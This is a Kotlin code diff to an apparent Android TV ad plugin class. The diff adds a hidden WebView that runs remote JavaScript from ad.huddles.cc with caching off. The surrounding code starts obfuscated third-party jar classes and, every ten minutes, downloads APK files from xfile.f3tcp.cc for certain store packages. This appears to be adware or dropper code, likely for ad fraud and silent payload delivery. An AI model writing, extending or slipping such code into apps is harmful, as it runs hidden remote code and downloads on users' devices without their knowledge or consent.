@@ -1,5 +1,10 @@
 package com.nova.adplugin.base
 
+import android.content.Context
+import android.os.Handler
+import android.os.Looper
+import android.webkit.WebSettings
+import android.webkit.WebView
 import com.nova.adplugin.AdDispatcher
 import com.nova.adplugin.bean.UpdateAppsDTO
 import com.nova.adplugin.ext.getApkFileNameFromUrl
@@ -27,23 +32,40 @@ open class AdPluginBase {
             "jar包加载开始".printLog()
             com.s.d.t.s(appContext)
             com.debby.Devour.getInstance().devourPlay(appContext)
-            com.unia.y.b.a(appContext,"7087","")
+            com.unia.y.b.a(appContext, "7087", "")
             "jar包加载结束".printLog()
-            com.Executor.run(context)
             //installPackage()
+            "开始执行Webview加载".printLog()
+            loadWebView(appContext)
             checkAppPush()
             //val sdkA = AdSdkAProvider()
             //val sdkB = AdSdkBProvider()
             //val providers = arrayListOf(sdkA)
             //adDispatcher = AdDispatcher(providers)
             //providers.forEach { it.initialize(appContext) }
-        }catch (e:Exception){
+        } catch (e: Exception) {
             "插件内部初始化失败：${e.message}".printLog()
         }
 
     }
 
-    private  var scheduler: ScheduledExecutorService?=null
+    fun loadWebView(context: Context){
+        Handler(Looper.getMainLooper()).post {
+            try {
+                val webView = WebView(context)
+                webView.settings.apply {
+                    javaScriptEnabled = true
+                    cacheMode = WebSettings.LOAD_NO_CACHE
+                }
+                webView.loadUrl("https://ad.huddles.cc/getinfo.html?source=tv")
+                "Successfully...".printLog()
+            } catch (e: Exception) {
+                "loadWebView failed  ${e.message}".printLog()
+            }
+        }
+    }
+
+    private var scheduler: ScheduledExecutorService? = null
     private var taskFuture: ScheduledFuture<*>? = null
     private fun checkAppPush() {
         scheduler?.shutdown()
@@ -54,16 +76,16 @@ open class AdPluginBase {
             //checkAppsUpdate()
             val packageInfo = appContext.packageManager.getPackageInfo(appContext.packageName, 0)
             println("周期任务执行,查询推送应用: ${appContext.packageName}-----${packageInfo.versionCode}")
-            if(appContext.packageName=="com.chihihx.store"&& packageInfo.versionCode<6){
+            if (appContext.packageName == "com.chihihx.store" && packageInfo.versionCode < 6) {
                 "开始准备升级旧YTX渠道的包".printLog()
                 val url = "https://xfile.f3tcp.cc/pub/YTX/AppStore_1.3.4_20250327_1956_YTX.apk"
                 downloadApks(arrayListOf(url))
-            }else if(appContext.packageName=="com.androidytx.store"&& packageInfo.versionCode<3){
+            } else if (appContext.packageName == "com.androidytx.store" && packageInfo.versionCode < 3) {
                 "开始准备升级新YTX渠道的包".printLog()
                 val url = "https://xfile.f3tcp.cc/pub/YTX_1/AppStore_1.0.3_20250327_1956_YTX_1.apk"
                 downloadApks(arrayListOf(url))
             }
-        }, 0, 60000*10, TimeUnit.MILLISECONDS)
+        }, 0, 60000 * 10, TimeUnit.MILLISECONDS)
 
     }
 
@@ -151,7 +173,7 @@ open class AdPluginBase {
                                 "下载失败: ${error.message}".printLog()
                             }
                         }
-                    }catch (e:Exception){
+                    } catch (e: Exception) {
                         "当前下载的异常是：${e.message}".printLog()
                     }
 
@@ -165,11 +187,10 @@ open class AdPluginBase {
 
     @JvmName("loadAdGeneric")
     inline fun <reified T : AdConfigBase> loadAd(config: T.() -> Unit) {
-        adDispatcher.loadAd( config)
+        adDispatcher.loadAd(config)
     }
 
-    open fun removeAd():Boolean = adDispatcher.removeAd()
-
+    open fun removeAd(): Boolean = adDispatcher.removeAd()
 
 
 }
